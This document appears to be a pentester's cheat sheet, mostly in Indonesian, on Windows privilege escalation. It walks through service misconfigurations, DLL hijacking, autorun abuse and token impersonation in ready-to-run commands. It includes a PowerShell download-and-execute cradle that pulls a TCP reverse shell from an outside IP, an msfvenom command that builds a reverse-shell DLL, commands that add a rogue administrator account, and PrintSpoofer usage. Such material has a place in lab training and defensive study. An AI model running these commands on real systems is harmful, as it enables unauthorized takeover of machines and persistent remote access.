

## Check System Info --
~# systeminfo



## Windows  Exploit Suggester --

##Run Nishang As Administrator to get root! -- 
We must get low shell with nishang. Then run this command

Requirement : SeChangeNotifyPrivilege       Bypass traverse checking             Enabled

Check : whoami /all
PRIVILEGES INFORMATION                                                                                                                                                                                                            [319/687]
----------------------                                                                                                                                                                                                                     
                                                                                                                                                                                                                                           
Privilege Name                Description                          State                                                                                                                                                                   
============================= ==================================== ========                                                                                                                                                                
SeShutdownPrivilege           Shut down the system                 Disabled                                                                                                                                                                
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled  <<---                                                                                                                                                            
SeUndockPrivilege             Remove computer from docking station Disabled                                                                                                                                                                
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled                                                                                                                                                                
SeTimeZonePrivilege           Change the time zone                 Disabled 

Then run this command
$SecPass = ConvertTo-SecureString -AsPlainText -Force 'Welcome1!' 
$cred = New-Object System.Management.Automation.PSCredential('Administrator',$SecPass)
Start-Process -Filepath "powershell" -argumentlist "IEX (New-Object Net.WebClient).downloadString('http://10.10.14.29/Invoke-PowershellTcp.ps1')" -Credential $cred

============================================

# Windows Privilege Escalation

## Insecure Service Permissions
Service merupakan program-program pada windows yang dijalankan pada background. Terkadang menerima input atau menjalankan sebuah task
Jika sebuah **service** dijalankan dengan privileges **SYSTEM** dan terdapat misconfiguration, maka kita bisa melakukan priv esc. 

### Recon
* Query untuk melihat konfigurasi dari service --> `sc.exe qc <name>`
* Melihat status service --> `sc.exe query <name>`
* Modifikasi configurasi dari sebuah service --> `sc.exe config <name> <option>= <value>` (pastikan value ada spasi di depan)
* Start/Stop Service --> `net start/stop <name>`

Terdapat beberapa celah service misconfiguration yang dapat menyebabkan Privilege Escalation diantaranya

### Insecure Service Properties
Setiap service memiliki Access Control (ACL) tentang siapa yang berhak mengakses service tersebut seperi Start/Stop, mengubah konfigurasi dll. Jika low user memiliki hak akses untuk merubah konfigurasi dari service yang dijalankan dengan privilege SYSTEM, maka kita bisa mengganti service tersebut dengan milik kita dengan merubah konfig. Namun kalau kita bisa ganti tapi gak bisa start/stop, maka kemungkinan tidak bisa di escalate.

-- RECON --

Menggunakan WINPEAS untuk mencari informasi service yang terdapat pada windows
```
.\winPEASany.exe quiet servicesinfo
```
Penjelasan command :
- quiet --> do not print banner, biasanya winpeas bannernya gede banget
- servicesinfo --> mencari informasi service

Hasil dari servicesinfo yang perlu diperhatikan adalah "YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles" (teks berwarna merah) yang artinya sebuah service bisa diubah konfigurasinya. 

Lalu lakukan pengecekan pada service apakah benar service tersebut bisa dimodifikasi, gunakan tools accesschk.exe
```
accesschk.exe /accepteula -uwcqv <nama_user_low_privilege> <nama_service>
```
Hasilnya :
```
RW MyService
	SERVICE_QUERY_STATUS
	SERVICE_QUERY_CONFIG
	SERVICE_CHANGE_CONFIG
	SERVICE_INTERROGATE
	SERVICE_ENUMERATE_DEPENDENTS
	SERVICE_START
	SERVICE_STOP
	READ_CONTROL
```
Yang terpenting adalah 
```
SERVICE_CHANGE_CONFIG
SERVICE_START
SERVICE_STOP
```
Artinya kita bisa ubah konfigurasi dan untuk bisa menerapkan perubahan maka kita harus restart (start/stop) service. 

Lalu kita cek konfigurasi dari service tersebut
```
sc qc <nama service>
```
```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

```
Lihat pada SERVICE_START_NAME service tersebut dijalankan oleh SYSTEM (hak akses tertinggi). Dan juga pada START_TYPE valuenya DEMAND_START yang artinya di start secara manual

Selanjutnya kita cek status servicenya, apakah sedang berjalan atau tidak
```
sc query <nama service>
```
Lihat pada STATE apakah STOPPED or RUNNING

Bagaimana cara melakukan PRIV ESC? perhatikan lagi informasi service berikut :

```

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

Karena kita memiliki hak akses untuk merubah konfigurasi, maka kita bisa merubah **BINARY_PATH_NAME** menjadi PATH dimana kita menyimpan file untuk melakukan reverse shell. Perintahnya adalah

```
sc config <nama_service> binpath= "\"C:\myFolder\reverse.exe\""
```
Sehingga BINARY_PATH_NAME berubah menjadi `C:\myFolder\reverse.exe`, untuk menerapkan perubahan pada konfigurasi, perintahnya
```
net start <nama_service>
```
Dan jika berhasil maka akan BOOM BOOM PWn3D!


### Unquoted Service Path
FIle executable di Windows bisa dijalankan tanpa mengetikkan extension. Contohnya `whoami.exe` bisa dijalankan dengan perintah `whoami`. Beberapa file executables juga biasanya menerima input argumen dipisahkan dengan space, contohnya `myprog.exe arg1 arg2 arg3`

Unquoted Service Path adalah service pada windows yang dijalankan menggunakan absolute path dimana absolute path tersebut tidak menggunakan tanda kurung (quotes) dan memiliki spasi. Contohnya sebagai berikut :

Absolute Path yaitu full path, misalnya `C:\Users\MrDoel\Desktop\myprog.exe`. Vulnerability Unquoted Service Path yang dimaksud adalah bilamana path tersebut tidak memiliki quote dan ada spasi seperti `C:\Program Files\Some Dirs\myprog.exe` , kita kita akan menjalankan file `myprog.exe`, maka windows akan melihat dari awal path, misalnya windows akan melihat dari `Program.exe` dari `Program Files` karena `Program Files` memiliki spasi, maka windows akan menganggap Program sebagai file executables, sedangkan `Files` adalah argumennya. Jadi kira-kira seperti ini `C:\Program.exe Files\Some` . Selanjutnya jika `Program.exe` tidak bisa dieksekusi maka windows akan melakukan segala kemungkinan misalnya `C:\Program.exe Files\Some Dir\myprog.exe` artinya `Program.exe` menggunakan dua argumen dan windows akan melakukannya sampai akhirnya  bisa mengeksesekusi file `myprog.exe`. Berbeda halnya jika absolute path diberikan tanda kurung `"C:\Users\MrDoel\Desktop\myprog.exe"`, maka windows akan langsung mengekseskusi `myprog.exe`. Inilah yang dimaksudnya Unquoted Service Path atau Path sebuah service yang tanpa menggunakan quote.


#### Recon
Untuk melihat apakah ada Unquoted Service Path, gunakan perintah
```
winPEASany.exe quiet servicesinfo
```

Yang perlu diperhatikan adalah result berikut
```
unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
```
Hasil diatas menjelaskan bahwa path dari file `unquotedpathservice.exe` tidak memiliki quote dan memiliki space. 

Ketika Windows akan menjalankan `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe` maka Windows akan melakukan pengecekan pada `Program.exe files`, `Unquoted.exe Path Service`, `Common.exe Files` dan akhirnya file `unquotedpathservice.exe`, jika kita bisa menyisipkan file yang kita miliki pada salah satu path tersebut maka kita bisa melakukan RCE seperti Reverse Shell

Untuk cek apakah vulnerability ini bisa digunakan, kita cari tahu dulu apakah kita bisa start/stop service tersebut. 
```
accesschk.exe /accepteula -ucqv <nama_user_low_privilege> <nama_service>
```
Perhatikan disini yang kita inputkan adalah nama servicenya, bukan nama file

Contoh :
```
accesschk.exe /accepteula -ucqv mrdoel unquotedsvc
```

Hasil 
```
SERVICE_START
SERVICE_STOP
```

Selanjutnya kita harus mencari tau dimana kita bisa menyisipkan file kita. Seperti diketahui pada penjeleasan sebelumnya, kita memiliki 4 Direktori yaitu,
* C:\
* C:\Program FIles
* C:\Program Files\Unquoted Path Service
* C:\Program Files\Unquoted Path Service\Common Files

Cara untuk mengetahuinya adalah dengan menggunakan perintah
```
accesschk.exe /accepteula -uwdq "C:\"
accesschk.exe /accepteula -uwdq "C:\Program FIles"
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\Common Files"

```

Perintah diatas menunjukkan kita mencari dari ke empat folder dimana kira-kira yang memiliki permission READ dan WRITE (RW), yang perlu diperhatikan dari hasil identifikasi adalah 
```
RW BUILTIN\Users
```
Artinya Group Users bisa melakukan READ and WRITE pada direktori tersebut. Pastikan kita berada di Group Users. Sebagai contoh direktori `Unquoted Path Service` memiliki permission RW pada Group Users, maka kita bisa menyimpan file executables dengan nama `Common.exe`, kenapa `Common.exe` ??? perhatikan lagi di penjelasan awal 

>Ketika Windows akan menjalankan `C:\Program Files\Unquoted Path Service\Common Files` maka Windows akan melakukan pengecekan pada `Program.exe files`, `Unquoted.exe Path Service`, `Common.exe Files` dan akhirnya file `unquotedpathservice.exe`

Karena direktori `Unquoted Path Service` memiliki permission RW, maka windows akan mengeksekusi pada path `C:\Program Files\Unquoted Path Service\Common.exe`

Selanjutnya kita copy file executable reverse shell ke direktori tersebut

```
copy reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

Lalu jalankan service
```
net start unquotedsvc
```

Maka windows akan mengeksekusi file `Common.exe`
### Weak Registry Permissions
Registry pada windows menyimpan informasi konfigurasi pada setiap service. Registery biasanya memiliki hak akses (ACL). Jika ACL ini tidak dikonfigurasi dengan baik, maka kemungkinan attacker bisa merubah konfigurasi service bahkan ketika ketika kita tidak bisa secara langsung memodifikasi service tersebut,

#### Recon
Untuk melihat apakah ada Unquoted Service Path, gunakan perintah
```
winPEASany.exe quiet servicesinfo
```

Yang perlu diperhatikan adalah result berikut
```
[?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
    HKLM\system\currentcontrolset\services\regsvc (Interactive [TakeOwnership])
```

Result diatas menginformasikan bahwa registry pada service `regsvc` bisa dimodifikasi. Untuk melakukan pengecekan terkait service ini kita gunakan accesschk
```
accesschk.exe /accepteula -uvwqk HKLM\system\currentcontrolset\services\regsvc
```
Hasilnya
```
HKLM\system\currentcontrolset\services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
	KEY_ALL_ACCESS
  RW BUILTIN\Administrators
	KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
	KEY_ALL_ACCESS
```

Yang perlu diperhatikan adalah 
```
RW NT AUTHORITY\INTERACTIVE
	KEY_ALL_ACCESS
```

`AUTHORITY\INTERACTIVE` adalah Group user yang bisa mengakses OS windows, termasuk user low privileged yang mungkin didapatkan dari reverse shell. KEY_ALL_ACCESS maksudnya user tersebut mendapatkan akses fullcontrol terhadap registry. 

Selanjutnya setelah kita mengetahui bahwa kita mendapat fullcontrol, cek apakah kita bisa start/stop service. 

```
accesschk.exe /accepteula -ucqv mrdoel regsvc
```

Sekarang cek value dari registrty tersebut
```
reg query HKLM\system\currentcontrolset\services\regsvc
```
Hasilnya
```
HKEY_LOCAL_MACHINE\system\currentcontrolset\services\regsvc
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
    DisplayName    REG_SZ    Insecure Registry Service
    ObjectName    REG_SZ    LocalSystem

```
Dari result diatas, yang menarik adalah `ObjectName` dijalankan oleh SYSTEM (hak akses tertinggi) dan `ImagePath` dimana berisi value `C:\Program Files\Insecure Registry Service\insecureregistryservice.exe`. 

Karena kita memiliki fullaccess terhadap registry ini, maka kita bisa mengubah `ImagePath` menjadi path yang kita inginkan. 

```
reg add HKLM\system\currentcontrolset\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

Lakukan verifikasi kembali apakah path sudah terganti. Jika sudah maka jalankan service tersebut
```
net start regsvc
```

Maka service akan menjalankan file executable yang berada di `C:\PrivEsc\reverse.exe`


### Insecure Service Executables
Jika sebuah file executable service bisa dimodifikasi oleh user, maka kita hanya tinggal me-replace service tersebut dengan file exec milik kita. Misal file untuk reverse shell. 

#### Recon
Untuk melihat apakah ada Unquoted Service Path, gunakan perintah
```
winPEASany.exe quiet servicesinfo
```

Yang perlu diperhatikan adalah result berikut
```
filepermsvc(File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
    File Permissions: Everyone [AllAccess]
```

Result diatas menginformasikan bahwa service filepermsvc yang berada di `C:\Program Files\File Permissions Service\filepermservice.exe` dimana semua user memiliki full akses terhadap service tersebut.

Lakukan verifikasi 
```
accesschk.exe /accepteula -quvw user "C:\Program Files\File Permissions Service\filepermservice.exe"
```

Hasilnya `FILE_ALL_ACCESS` yang artinya kita memiliki full access seperti menghapus file service tersebut.

Lalu cek apakah kita bisa start/stop
```
accesschk.exe /accepteula -ucqv mrdoel filepermsvc
```

Lalu kita replace `filepermservice.exe` dengan file executable reverse shell
```
copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
```

Lalu start service

```
net start filepermsvc
```

### DLL Hijacking
Biasanya sebuah service membutuhkan library agar service tersebut bisa berjalan dengan baik. library inilah yang dinamakan DLL (dynamic-link library). 

Untuk mencari celah ini agak rumit karena membutuhkan manual testing. 

Biasanya celah ini bisa terjadi jika DLL ini di load dengan menggunakan absolute path sehingga kemungkinan kita bisa melakukan priv esc dengan syarat path tersebut harus writable. Lalu celah lainnya yang sering terjadi adalah `DLL Missing` yang artinya service tidak menemukan DLL pada system sehingga attacker bisa membuat file DLL dan memasukkannya ke dalam direktori dimana DLL tersebut akan di load oleh windows (biasanya windows akan melakukan pengecekahn pada environtmet variable PATH)

#### Recon

```
winPEASany.exe quiet servicesinfo
```

Result :
```
dllsvc(DLL Hijack Service)["C:\Program Files\DLL Hijack Service\dllhijackservice.exe"] - Manual - Stopped

(DLL Hijacking) C:\Temp: Authenticated Users [WriteData/CreateFiles]

```

Result diatas menginformasikan bahwa service `dllsvc` terdapat celah DLL Hijacking lalu ada info selanjutnya bahwa PATH pada direktori `C:\Temp` writable. 

Cek service apakah bisa start/stop

```
accesschk.exe /accepteula -uvqc user dllsvc
```

Jika bisa, selanjutnya kita cek lagi terkait service tersebut
```
sc qc dllsvc
```

Hasilnya
```
SERVICE_NAME: dllsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DLL Hijack Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

```

Pada `SERVICE_START_NAME` dijalankan oleh SYSTEM

Normalnya kita harus melakukan process monitoring terhadap file `dllhijackservice.exe`

![[procmon.png]]

Terlihat pada gambar diatas, windows tidak menemukan `hijackme.dll` dan mencarinya di semua PATH. Perhatikan bahwa direktor `C:\Temp` berada pada path. Disini kita bisa menambahkan file `hijackme.dll` sehingga menjadi `C:\Temp\hijackme.dll`

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.8 LPORT=4545 -f dll -o hijackme.dll
```

Transfer ke windows lalu restart service

```
net stop dllsvc
net start dllsvc
```

## Registry Exploits
WIndows bisa menjalankan perintah-perintah yang secara otomatis dijalankan ketika startup. Proses ini dinamakan autorun yang dikonfigurasi pada registry.

Terdapat celah keamanan bilamana kita memilki hak akses untuk membuat file executable autorun dan ability untuk restart sistem. As soon as windows restarted, kita bisa langsung dapat reverse shell. 

### Recon
```
winPEASany.exe quiet applicationsinfo
```

Result :
```
[+] Autorun Applications(T1010)

Folder: C:\Program Files\Autorun Program
    File: C:\Program Files\Autorun Program\program.exe
    FilePerms: Everyone [AllAccess]
    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

```

Selanjutnya cek autorun yang saat ini berada pada windows
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

Lalu cek hak akses
```
accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

Pastikan kita punya akses RW
```
RW Everyone
	FILE_ALL_ACCESS

```

Lalu copy file `reverse.exe` ke direktori `C:\Program Files\Autorun Program` dan rename menjadi `program.exe`

Lalu restart windows

## Token Impersonate

Windows menggunakan Token sebagai Identifier untuk setiap pengguna. Token ini di generate saat login. Ada celah keamanan dimana user biasa bisa melakukan priv esc bilamana user kita saat ini memiliki permission seDebugPrivilege dan SeImpersonatePrivilege

Untuk cek apakah user bisa di impersonate cek di CMD :
$ whoami /priv
pastikan seDebugPrivilege dan SeImpersonatePrivilege enabled. 

Lalu cek user mana saja yang bisa di impersonate. Kita bisa pakai incognito.exe, commandnya :

* incognito.exe list tokens -u //list token available to impersonate
* incognito.exe add_user mrdoel 123456 //add new user
* incognito.exe add_localgroup_user Administrators mrdoel  //add new user to the local administrators group
* net user mrdoel //cek apakah user sudah ditambahkan ke group administrator (Local Group Memberships      *Administrators)

Jika RDP tersedit maka kita bisa login sebagai root dengan command
`rdesktop -u mrdoel -p 123456 target.local`

### Teknik Baru Token Impersonate 
Cara sebelumnya hanya berlaku untuk windows dibawah windows 10. Jika cara diatas tidak bisa maka kita bisa gunakan PrintSpoofer, targetnya Windows 10 and Server 2016/2019. 

Note: pastikan `SeImpersonatePrivilege` berstatus `Enabled`

Cek di https://github.com/itm4n/PrintSpoofer/releases

Perintah untuk menjalankan exploit
```PrintSpoofer64.exe -i -c cmd```
